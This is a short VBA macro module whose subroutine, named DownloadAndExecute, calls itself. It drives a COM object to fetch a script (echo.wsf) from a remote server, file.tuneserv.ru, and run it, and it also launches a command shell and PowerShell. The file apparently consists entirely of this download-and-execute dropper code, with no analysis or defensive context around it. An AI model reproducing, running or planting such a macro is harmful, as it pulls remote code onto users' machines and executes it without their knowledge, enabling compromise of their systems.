'Attribute VB_Name = "Module1"
Sub DownloadAndExecute()
    Dim NITRun01
    Set NITRun01 = CreateObject("ATLCNITRUN01.1")
    NITRun01.Sides = 4
    NITRun01.GETPARAMMSG
    NITRun01.Sides = 5
    NITRun01.strURL "http://file.tuneserv.ru:80/Exponenta/Distrib/LIB-WSH/"
    NITRun01.GETPARAMMSG
    NITRun01.Sides = 6
    NITRun01.strProc = "echo.wsf"
    NITRun01.GETPARAMMSG
    NITRun01.Sides = 7
    NITRun01.GETPARAMMSG
    NITRun01.RUNSCRIPT
    NITRun01.GETPARAMMSG
    NITRun01.Sides = 8
    NITRun01.RUNSCRIPT
    NITRun01.RUNCMDSHELL
    NITRun01.RUNPWSH
    NITRun01.Sides = 9
End Sub

DownloadAndExecute